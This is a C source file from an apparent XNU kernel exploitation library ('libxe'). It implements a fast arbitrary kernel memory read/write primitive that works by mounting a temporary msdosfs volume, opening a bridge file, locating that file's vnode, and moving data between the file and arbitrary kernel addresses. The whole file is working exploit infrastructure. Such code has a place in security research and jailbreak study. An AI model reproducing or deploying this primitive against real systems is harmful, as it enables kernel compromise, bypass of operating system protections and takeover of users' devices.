//
//  kmem_fast.c
//  libxe
//
//  Created by sreejith on 3/12/22.
//

#include <limits.h>

#include <sys/fcntl.h>
#include <sys/mount.h>

#include "memory/kmem_fast.h"
#include "memory/kmem.h"
#include "memory/kmem_internal.h"
#include "xnu/proc.h"
#include "util/vnode.h"
#include "util/msdosfs.h"
#include "util/assert.h"
#include "util/log.h"


#define MAX_RW_SIZE 1024


///
/// This module provides a fast arbitary kernel memory read / write primitive by using the
/// module `utils/vnode.c` to read / write data from / to arbitrary kernel memory location
/// via a vnode to a open file. To write data to a arbitary kernel memory location `dst`, from
/// user memory `src` of size `length`, the data `src` is first written to a open file `bridge_fd`.
/// Then we use `xpl_vnode_read_kernel` method to copy the data in `bridge_vnode` to
/// `dst`. Similarly to read data from a arbitary kernel memory location `src` of size `length` to
/// user memory `dst`, we use `xpl_vnode_write_kernel` method to copy the data from
/// `src` to `bridge_vnode` and then we read the data from `bridge_fd` to user buffer `dst`
///


typedef struct xpl_memory_kmem_fast {
    xpl_vnode_t util_vnode;
    xpl_msdosfs_t util_msdosfs;
    int bridge_fd;
    uintptr_t bridge_vnode;
} *xpl_memory_kmem_fast_t;


void xpl_memory_kmem_fast_read(void* ctx, void* dst, uintptr_t src, size_t size) {
    xpl_memory_kmem_fast_t kmem = (xpl_memory_kmem_fast_t)ctx;
    
    off_t off = lseek(kmem->bridge_fd, 0, SEEK_SET);
    xpl_assert_errno(off < 0);
    
    /// Copy data from `src` to `bridge_fd`
    xpl_vnode_write_kernel(kmem->util_vnode, kmem->bridge_vnode, src, size);
    
    ssize_t bytes_read = read(kmem->bridge_fd, dst, size);
    xpl_assert_cond(bytes_read, ==, size)
}


void xpl_memory_kmem_fast_write(void* ctx, uintptr_t dst, const void* src, size_t size) {
    xpl_memory_kmem_fast_t kmem = (xpl_memory_kmem_fast_t)ctx;
    
    off_t off = lseek(kmem->bridge_fd, 0, SEEK_SET);
    xpl_assert_errno(off < 0);
    ssize_t bytes_written = write(kmem->bridge_fd, src, size);
    xpl_assert_cond(bytes_written, ==, size);
    
    /// Copy data from `bridge_fd` to `dst`
    xpl_vnode_read_kernel(kmem->util_vnode, kmem->bridge_vnode, dst, size);
}


const static struct xpl_kmem_ops xpl_memory_kmem_fast_ops = {
    .read = xpl_memory_kmem_fast_read,
    .write = xpl_memory_kmem_fast_write,
    .max_read_size = MAX_RW_SIZE,
    .max_write_size = MAX_RW_SIZE,
};


xpl_msdosfs_t xpl_memory_kmem_setup_vol(int* bridge_fd) {
    xpl_msdosfs_t vol = xpl_msdosfs_mount(64, MNT_DONTBROWSE);
    
    char mount[sizeof(XPL_MOUNT_TEMP_DIR)];
    xpl_msdosfs_mount_point(vol, mount);
    
    char path[sizeof(mount) + 7];
    snprintf(path, sizeof(path), "%s/bridge", mount);
    int fd = open(path, O_CREAT | O_RDWR | O_EXLOCK, S_IRWXU);
    xpl_assert_errno(fd < 0);
    
    int res = ftruncate(fd, MAX_RW_SIZE);
    xpl_assert_errno(res);
    
    *bridge_fd = fd;
    return vol;
}


xpl_kmem_backend_t xpl_memory_kmem_fast_create(void) {
    int fd_bridge;
    xpl_msdosfs_t util_msdos = xpl_memory_kmem_setup_vol(&fd_bridge);
    
    xpl_assert_errno(fd_bridge < 0);
    uintptr_t vnode_bridge;
    int error = xpl_proc_find_fd_data(xpl_proc_current_proc(), fd_bridge, &vnode_bridge);
    xpl_assert_err(error);
    xpl_log_debug("bridge file opened at fd: %d, vnode: %p", fd_bridge, (void*)vnode_bridge);
    
    xpl_memory_kmem_fast_t kmem = malloc(sizeof(struct xpl_memory_kmem_fast));
    kmem->bridge_fd = fd_bridge;
    kmem->bridge_vnode = vnode_bridge;
    kmem->util_vnode = xpl_vnode_create();
    kmem->util_msdosfs = util_msdos;
    
    return xpl_kmem_backend_create(&xpl_memory_kmem_fast_ops, kmem);
}


void xpl_memory_kmem_fast_destroy(xpl_kmem_backend_t* backend_p) {
    xpl_memory_kmem_fast_t kmem = xpl_kmem_backend_get_ctx(*backend_p);
    xpl_vnode_destroy(&kmem->util_vnode);
    close(kmem->bridge_fd);
    xpl_msdosfs_unmount(&kmem->util_msdosfs);
    free(kmem);
    xpl_kmem_backend_destroy(backend_p);
}
